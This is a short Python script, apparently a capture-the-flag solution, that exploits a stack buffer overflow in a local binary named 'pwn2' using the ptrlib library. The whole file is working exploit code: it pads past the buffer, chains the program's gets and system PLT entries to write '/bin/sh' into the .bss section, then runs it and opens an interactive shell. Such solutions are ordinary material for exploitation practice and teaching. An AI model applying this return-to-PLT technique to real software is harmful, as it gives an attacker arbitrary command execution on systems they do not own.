from ptrlib import *

elf = ELF("./pwn2")
sock = Process("./pwn2")

plt_gets = 0x080483d0
plt_system = 0x080483f0

payload = b'A' * 0x2C
payload += p32(plt_gets)
payload += p32(plt_system)
payload += p32(elf.symbol("__bss_start"))
payload += p32(elf.symbol("__bss_start"))

sock.recvuntil("$ ")
sock.sendline(payload)

sock.send("/bin/sh\x00")

sock.interactive()
